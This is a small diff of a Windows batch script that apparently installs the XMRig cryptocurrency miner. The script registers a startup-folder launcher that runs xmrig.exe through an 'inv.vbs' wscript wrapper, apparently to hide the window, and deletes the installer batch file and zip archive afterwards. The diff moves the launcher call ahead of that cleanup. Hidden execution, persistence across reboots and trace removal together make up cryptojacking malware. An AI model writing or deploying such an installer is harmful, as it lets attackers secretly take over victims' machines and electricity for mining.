@@ -12,11 +12,11 @@ set startupFile=%startupFolder%\start_xmrig.bat
 
 echo wscript.exe "%USERPROFILE%\XMR\inv.vbs" "%USERPROFILE%\XMR\xmrig.exe" > "%startupFile%"
 
+call "%startupFile%"
+
 endlocal
 
 del "%USERPROFILE%\Desktop\install.bat"
 del "xmrig.zip"
-
-call "%startupFile%"
 
 exit
